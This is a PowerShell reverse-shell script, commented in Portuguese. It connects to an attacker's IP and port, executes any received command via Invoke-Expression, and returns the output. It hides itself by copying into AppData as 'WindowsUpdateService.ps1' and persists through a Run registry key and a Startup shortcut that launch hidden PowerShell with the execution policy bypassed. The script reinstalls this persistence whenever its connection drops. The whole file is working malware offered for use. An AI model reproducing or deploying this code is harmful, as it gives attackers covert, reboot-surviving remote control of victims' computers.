# ==========================================
#          VARIÁVEIS DE CONFIGURAÇÃO
# ==========================================
$DEFAULT_IP = "127.0.0.1"
$DEFAULT_PORT = 4444
$RECONNECT_COOLDOWN = 10 # Segundos de espera ao cair a conexão
# ==========================================
# made by github.com/wrxxnch
# ig: @wrxxnch

function Get-TargetEndpoint {
    param([string]$Arg)
    if ($Arg -and $Arg -match ":") {
        $parts = $Arg.Split(":")
        return @{ IP = $parts[0].Trim(); Port = [int]$parts[1].Trim() }
    }
    return @{ IP = $DEFAULT_IP; Port = $DEFAULT_PORT }
}

function Invoke-Persist {
    try {
        $currentScriptPath = $MyInvocation.MyCommand.Path
        if (-not $currentScriptPath) {
            $currentScriptPath = $PSCommandPath
        }
        if (-not $currentScriptPath) {
            $currentScriptPath = $script.FullName
        }
        if (-not $currentScriptPath) {
            return "[-] Erro: Não foi possível determinar o caminho do script.\n"
        }

        $endpoint = Get-TargetEndpoint $args[0]
        $cliArg = "$($endpoint.IP):$($endpoint.Port)"

        $results = @()
        $appData = [Environment]::GetFolderPath("ApplicationData")
        $targetDir = Join-Path $appData "Microsoft\Windows"
        
        if (-not (Test-Path $targetDir)) {
            New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
        }

        # Caminho fixo definitivo onde o script persistente vai residir
        $persistentScriptPath = Join-Path $targetDir "WindowsUpdateService.ps1"

        # Copia o script atual para o diretório definitivo caso já não esteja lá
        if ($currentScriptPath.ToLower() -ne $persistentScriptPath.ToLower()) {
            Copy-Item -Path $currentScriptPath -Destination $persistentScriptPath -Force
        }

        # O comando exato que você solicitou para execução oculta
        $execCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistentScriptPath`" `"$cliArg`""

        # 1. Persistência no Registro do Windows (Run)
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "WindowsUpdateService" -Value $execCommand -ErrorAction SilentlyContinue
        $results += "[+] Persistência aplicada no Registro do Windows (Run)."

        # 2. Persistência na pasta Startup (shell:startup)
        $startupFolder = [Environment]::GetFolderPath("Startup")
        if (-not $startupFolder) {
            $startupFolder = Join-Path $appData "Microsoft\Windows\Start Menu\Programs\Startup"
        }

        if (Test-Path $startupFolder) {
            $shortcutPath = Join-Path $startupFolder "WindowsUpdateService.lnk"
            $WScriptShell = New-Object -ComObject WScript.Shell
            $Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
            $Shortcut.TargetPath = "powershell.exe"
            $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistentScriptPath`" `"$cliArg`""
            $Shortcut.WorkingDirectory = $targetDir
            $Shortcut.Save()
            $results += "[+] Persistência aplicada na pasta Startup."
        }

        return ($results -join "`n") + "`n"
    } catch {
        return "[-] Erro ao aplicar persistência: $_`n"
    }
}

function Remove-Persist {
    try {
        $results = @()
        
        # Remove do Registro
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        if (Get-ItemProperty -Path $regPath -Name "WindowsUpdateService" -ErrorAction SilentlyContinue) {
            Remove-ItemProperty -Path $regPath -Name "WindowsUpdateService" -ErrorAction SilentlyContinue
            $results += "[+] Removido do Registro do Windows."
        }

        # Remove da Pasta Startup
        $startupFolder = [Environment]::GetFolderPath("Startup")
        $shortcutPath = Join-Path $startupFolder "WindowsUpdateService.lnk"
        if (Test-Path $shortcutPath) {
            Remove-Item $shortcutPath -Force -ErrorAction SilentlyContinue
            $results += "[+] Removido atalho da pasta Startup."
        }

        # Remove o arquivo físico copiado no AppData
        $appData = [Environment]::GetFolderPath("ApplicationData")
        $persistentScriptPath = Join-Path $appData "Microsoft\Windows\WindowsUpdateService.ps1"
        if (Test-Path $persistentScriptPath) {
            Remove-Item $persistentScriptPath -Force -ErrorAction SilentlyContinue
            $results += "[+] Arquivo oculto removido do AppData."
        }

        if ($results.Count -eq 0) {
            return "[*] Nenhuma persistência encontrada para remover.`n"
        }
        return ($results -join "`n") + "`n"
    } catch {
        return "[-] Erro ao remover persistência: $_`n"
    }
}

function Get-HelpMenu {
    return @"
`e[1;36m=============================================(`e[0m
`e[1;33m            COMANDOS PRÉ-PRONTOS (HELP)      `e[0m
`e[1;36m=============================================(`e[0m
 `e[1;32mhelp`e[0m           - Exibe este menu de ajuda
 `e[1;32mpersist`e[0m        - Aplica a persistência manualmente
 `e[1;32mremove_persist`e[0m - Remove todas as persistências
 `e[1;32msysinfo`e[0m        - Exibe informações detalhadas do sistema
 `e[1;32mtasks`e[0m          - Lista todos os processos em execução
 `e[1;32mnetstat`e[0m        - Exibe conexões de rede ativas
 `e[1;32mexit`e[0m           - Encerra a sessão e ativa a persistência
`e[1;36m=============================================(`e[0m
"@
}

function Start-ReverseShell {
    $endpoint = Get-TargetEndpoint $args[0]
    $targetIP = $endpoint.IP
    $targetPort = $endpoint.Port

    while ($true) {
        $client = $null
        $stream = $null
        $writer = $null
        $reader = $null
        $sessionActive = $true

        try {
            $client = New-Object System.Net.Sockets.TcpClient($targetIP, $targetPort)
            $stream = $client.GetStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true

            while ($sessionActive -and $client.Connected) {
                if ($stream.DataAvailable -eq $false -and -not $reader.Peek()) {
                    Start-Sleep -Milliseconds 100
                    continue
                }

                $command = $reader.ReadLine()
                if ($null -eq $command) { break }
                $command = $command.Trim()

                if ($command -eq "") { continue }

                $output = ""

                try {
                    $cmdLower = $command.ToLower()
                    if ($cmdLower -eq "exit") {
                        $writer.WriteLine("`e[1;31mSessao encerrada. Aplicando persistencia...`e[0m")
                        $sessionActive = $false
                        break
                    }
                    elseif ($cmdLower -eq "help") {
                        $output = Get-HelpMenu
                    }
                    elseif ($cmdLower -eq "persist") {
                        $output = Invoke-Persist $args[0]
                    }
                    elseif ($cmdLower -eq "remove_persist") {
                        $output = Remove-Persist
                    }
                    elseif ($command -match "^cd\s*(.*)$") {
                        $targetDir = $matches[1].Trim()
                        if ($targetDir -eq "") { $targetDir = "~" }
                        
                        $targetDir = $targetDir -replace '^["'']|["'']$', ''
                        if ($targetDir -eq "~") { $targetDir = [Environment]::GetFolderPath("UserProfile") }

                        if ($targetDir -match "^[a-zA-Z]:$") {
                            Set-Location $targetDir
                        } else {
                            Set-Location $targetDir -ErrorAction Stop
                        }
                        $output = "`e[1;32m$(Get-Location)`e[0m"
                    }
                    else {
                        $output = Invoke-Expression $command 2>&1 | Out-String
                    }
                }
                catch {
                    $output = "`e[1;31m[-] Erro ao executar comando: $_`e[0m"
                }

                if (-not $output) {
                    $output = "`e[1;32m[+] Comando executado sem retorno.`e[0m"
                }

                $writer.WriteLine($output)
            }
        }
        catch {
            # Erro de conexão
        }
        finally {
            if ($reader) { $reader.Close() }
            if ($writer) { $writer.Close() }
            if ($client) { $client.Close() }
        }

        # Dispara a persistência ao cair ou fechar a sessão
        $null = Invoke-Persist $args[0]
        Start-Sleep -Seconds $RECONNECT_COOLDOWN
    }
}

Start-ReverseShell $args[0]
